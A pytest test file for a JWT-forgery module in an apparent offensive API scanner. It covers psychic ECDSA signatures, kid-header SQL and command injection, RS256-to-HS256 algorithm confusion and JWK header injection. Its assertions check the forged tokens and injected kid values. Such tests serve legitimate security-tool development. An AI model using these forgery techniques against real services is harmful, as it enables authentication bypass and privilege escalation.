"""JWT forgery primitives, incl. the Batch-1 additions (alg-confusion, jwk, psychic, kid-inject)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json

import pytest

from gradientql.utils import jwt_attacks as jw


def _b64u_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _parts(token: str):
    h, p, s = token.split(".")
    return json.loads(_b64u_dec(h)), json.loads(_b64u_dec(p)), s


# --------------------------------------------------------------------------- #
# psychic signature (ECDSA r=s=0)
# --------------------------------------------------------------------------- #

def test_psychic_zero_signature():
    hdr, pay, sig = _parts(jw.forge_psychic({"sub": "1"}, "ES256"))
    assert hdr["alg"] == "ES256"
    assert pay["admin"] is True  # escalated
    assert _b64u_dec(sig) == b"\x00" * 64
    assert set(_b64u_dec(sig)) == {0}


def test_psychic_es512_length():
    _, _, sig = _parts(jw.forge_psychic(None, "ES512"))
    assert len(_b64u_dec(sig)) == 132


# --------------------------------------------------------------------------- #
# kid injection
# --------------------------------------------------------------------------- #

def test_kid_sqli_signs_with_injected_key():
    hdr, _, _ = _parts(jw.forge_kid_injection(None, "sqli"))
    assert "UNION SELECT" in hdr["kid"]
    assert jw._KID_INJECT_KEY in hdr["kid"]
    # the token is signed with the value the injection makes the lookup return
    tok = jw.forge_kid_injection({"sub": "1"}, "sqli")
    h, p, s = tok.split(".")
    expect = hmac.new(jw._KID_INJECT_KEY.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    assert _b64u_dec(s) == expect


def test_kid_command_mode():
    hdr, _, _ = _parts(jw.forge_kid_injection(None, "command"))
    assert "echo" in hdr["kid"]


# --------------------------------------------------------------------------- #
# alg confusion (RS256 -> HS256): HMAC signed with the PEM
# --------------------------------------------------------------------------- #

def test_alg_confusion_hmacs_with_pem():
    pem = "-----BEGIN PUBLIC KEY-----\nAAAA\n-----END PUBLIC KEY-----\n"
    tok = jw.forge_alg_confusion(pem, {"sub": "1"})
    h, p, s = tok.split(".")
    assert json.loads(_b64u_dec(h))["alg"] == "HS256"
    expect = hmac.new(pem.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    assert _b64u_dec(s) == expect


# --------------------------------------------------------------------------- #
# JWK -> PEM and jwk-header injection (verified with cryptography, test-only)
# --------------------------------------------------------------------------- #

def test_jwk_to_pem_roundtrips():
    crypto = pytest.importorskip("cryptography.hazmat.primitives.serialization")
    n_b64 = jw._b64u(jw._int_to_bytes(jw._ATTACKER_RSA_N))
    e_b64 = jw._b64u(jw._int_to_bytes(jw._ATTACKER_RSA_E))
    pem = jw.jwk_to_pem(n_b64, e_b64)
    assert pem.startswith("-----BEGIN PUBLIC KEY-----")
    key = crypto.load_pem_public_key(pem.encode())
    assert key.public_numbers().n == jw._ATTACKER_RSA_N
    assert key.public_numbers().e == jw._ATTACKER_RSA_E


def test_rs256_sign_verifies():
    padding = pytest.importorskip("cryptography.hazmat.primitives.asymmetric.padding")
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa

    msg = b"header.payload"
    sig = jw._rs256_sign(msg, jw._ATTACKER_RSA_D, jw._ATTACKER_RSA_N)
    pub = rsa.RSAPublicNumbers(jw._ATTACKER_RSA_E, jw._ATTACKER_RSA_N).public_key()
    pub.verify(sig, msg, padding.PKCS1v15(), hashes.SHA256())  # raises on mismatch


def test_jwk_injection_is_self_consistent():
    padding = pytest.importorskip("cryptography.hazmat.primitives.asymmetric.padding")
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa

    tok = jw.forge_jwk_injection({"sub": "1"})
    h, p, s = tok.split(".")
    hdr = json.loads(_b64u_dec(h))
    assert hdr["alg"] == "RS256" and hdr["jwk"]["kty"] == "RSA"
    # the embedded jwk must be the key that validates the token (that's the whole attack)
    n = int.from_bytes(_b64u_dec(hdr["jwk"]["n"]), "big")
    e = int.from_bytes(_b64u_dec(hdr["jwk"]["e"]), "big")
    pub = rsa.RSAPublicNumbers(e, n).public_key()
    pub.verify(_b64u_dec(s), f"{h}.{p}".encode(), padding.PKCS1v15(), hashes.SHA256())


# --------------------------------------------------------------------------- #
# JWKS discovery
# --------------------------------------------------------------------------- #

class _Resp:
    def __init__(self, status, body):
        self.status_code = status
        self._body = body

    def json(self):
        return self._body


class _Session:
    def __init__(self, mapping):
        self.mapping = mapping

    def get(self, url, timeout=None):
        for k, v in self.mapping.items():
            if url.endswith(k):
                return v
        return _Resp(404, {})


def test_fetch_rsa_pubkey_pem_from_jwks():
    n_b64 = jw._b64u(jw._int_to_bytes(jw._ATTACKER_RSA_N))
    jwks = _Resp(200, {"keys": [{"kty": "RSA", "n": n_b64, "e": "AQAB", "kid": "1"}]})
    sess = _Session({"/.well-known/jwks.json": jwks})
    pem = jw.fetch_rsa_pubkey_pem("https://api.example.com/graphql", sess)
    assert pem and "BEGIN PUBLIC KEY" in pem


def test_fetch_rsa_pubkey_pem_none_when_absent():
    sess = _Session({})  # every path 404s
    assert jw.fetch_rsa_pubkey_pem("https://api.example.com/graphql", sess) is None


# --------------------------------------------------------------------------- #
# tool dispatch
# --------------------------------------------------------------------------- #

def test_tool_forge_jwt_dispatches_new_approaches():
    from gradientql.scanner.arsenal_tools import tool_forge_jwt
    h = {"jwt": []}
    assert json.loads(_b64u_dec(tool_forge_jwt("psychic", None, None, h).split(".")[0]))["alg"] == "ES256"
    assert json.loads(_b64u_dec(tool_forge_jwt("jwk", None, None, h).split(".")[0]))["alg"] == "RS256"
    assert "kid" in json.loads(_b64u_dec(tool_forge_jwt("kid_sqli", None, None, h).split(".")[0]))
    pem = "-----BEGIN PUBLIC KEY-----\nX\n-----END PUBLIC KEY-----\n"
    assert json.loads(_b64u_dec(tool_forge_jwt("confusion", pem, None, h).split(".")[0]))["alg"] == "HS256"


def test_forged_tokens_new_lists():
    assert jw.forged_tokens("jwt_psychic") and jw.forged_tokens("jwt_jwk_inject")
    assert len(jw.forged_tokens("jwt_kid_sqli")) == 2
